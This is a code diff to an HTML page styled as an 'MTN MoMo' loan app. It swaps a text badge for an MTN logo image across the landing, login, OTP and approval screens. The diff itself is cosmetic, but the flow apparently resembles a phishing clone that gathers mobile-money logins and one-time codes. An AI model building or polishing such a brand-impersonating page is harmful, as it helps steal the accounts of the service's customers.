@@ -48,22 +48,15 @@
     .modal p  { font-size: 0.88rem; color: var(--text-light); line-height: 1.4; }
 
     /* BRAND / LOGO */
-    .brand-badge {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      width: 36px;
-      height: 36px;
-      background: var(--yellow);
-      color: var(--navy-dark);
-      font-weight: 800;
-      font-size: 0.85rem;
+    .logo-img { 
+      width: 36px; 
+      height: 36px; 
+      object-fit: contain; 
+      display: block; 
       border-radius: 50%;
-      letter-spacing: -0.02em;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
-      flex-shrink: 0;
     }
-    .logo-img { width: 36px; height: 36px; object-fit: contain; display: block; }
+    .logo-img-sm { width: 28px; height: 28px; }
+    .logo-img-lg { width: 52px; height: 52px; }
 
     .hp-logo-inline { display: flex; align-items: center; gap: 10px; }
     .hp-logo-inline .brand { font-size: 1.35rem; font-weight: 800; color: #FFF; letter-spacing: -0.02em; }
@@ -303,7 +296,7 @@
   <nav class="land-nav">
     <div class="hbg"><span></span><span></span><span></span></div>
     <div class="hp-logo-inline">
-        <div class="brand-badge">MoMo</div>
+        <img src="images/mtn-logo.png" alt="MTN Logo" class="logo-img">
         <div class="brand">MTN <span>MoMo</span></div>
     </div>
     <div style="width:28px"></div>
@@ -346,7 +339,7 @@
   <nav class="navbar">
     <a class="nav-left" onclick="goTo('page-landing')">← Back</a>
     <div class="hp-logo-sm">
-      <div class="brand-badge" style="width:28px;height:28px;font-size:0.7rem;">MoMo</div>
+      <img src="images/mtn-logo.png" alt="MTN Logo" class="logo-img logo-img-sm">
       <div class="brand">MTN <span>MoMo</span></div>
     </div>
     <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
@@ -400,7 +393,7 @@
   <nav class="navbar">
     <a class="nav-left" onclick="goTo('page-step1')">← Back</a>
     <div class="hp-logo-sm">
-      <div class="brand-badge" style="width:28px;height:28px;font-size:0.7rem;">MoMo</div>
+      <img src="images/mtn-logo.png" alt="MTN Logo" class="logo-img logo-img-sm">
       <div class="brand">MTN <span>MoMo</span></div>
     </div>
     <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
@@ -437,7 +430,7 @@
   <nav class="navbar">
     <a class="nav-left" onclick="goTo('page-step2')">← Back</a>
     <div class="hp-logo-sm">
-      <div class="brand-badge" style="width:28px;height:28px;font-size:0.7rem;">MoMo</div>
+      <img src="images/mtn-logo.png" alt="MTN Logo" class="logo-img logo-img-sm">
       <div class="brand">MTN <span>MoMo</span></div>
     </div>
     <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
@@ -492,7 +485,7 @@
 <div id="page-login" class="page">
   <div class="login-hdr">
     <div class="hp-logo-inline" style="flex-direction:column;gap:6px;">
-      <div class="brand-badge" style="width:48px;height:48px;font-size:1.1rem;">MoMo</div>
+      <img src="images/mtn-logo.png" alt="MTN Logo" class="logo-img logo-img-lg">
       <div class="brand" style="font-size:1.6rem;">MTN <span>MoMo</span></div>
       <div class="logo-sub">Fast and Easy Loans</div>
     </div>
@@ -524,7 +517,7 @@
   <div class="lg-curve">
     <div class="lg-foot">
       <div class="hp-logo-inline" style="flex-direction:column;gap:4px;">
-        <div class="brand-badge" style="width:32px;height:32px;font-size:0.75rem;">MoMo</div>
+        <img src="images/mtn-logo.png" alt="MTN Logo" class="logo-img">
         <div class="brand" style="font-size:1.15rem;">MTN <span>MoMo</span></div>
       </div>
       <div class="lg-version">v2.1.3P</div>
@@ -538,7 +531,7 @@
   <div class="otp-topbar">
     <button class="bk" onclick="goTo('page-login')">←</button>
     <div class="hp-logo-sm">
-      <div class="brand-badge" style="width:28px;height:28px;font-size:0.7rem;">MoMo</div>
+      <img src="images/mtn-logo.png" alt="MTN Logo" class="logo-img logo-img-sm">
       <div class="brand" style="color:var(--navy);"><span style="color:var(--yellow-dark);">MTN</span> MoMo</div>
     </div>
     <div class="hbg2"><span></span><span></span><span></span></div>
@@ -589,7 +582,7 @@
   <div class="appr-wrap">
     <div class="appr-top">
       <div class="hp-logo-sm" style="justify-content: center; margin-bottom: 14px;">
-        <div class="brand-badge" style="width:30px;height:30px;font-size:0.75rem;">MoMo</div>
+        <img src="images/mtn-logo.png" alt="MTN Logo" class="logo-img logo-img-sm">
         <div class="brand" style="color: var(--navy);"><span style="color: var(--yellow-dark);">MTN</span> MoMo</div>
       </div>
       <div class="check-circle">✓</div>
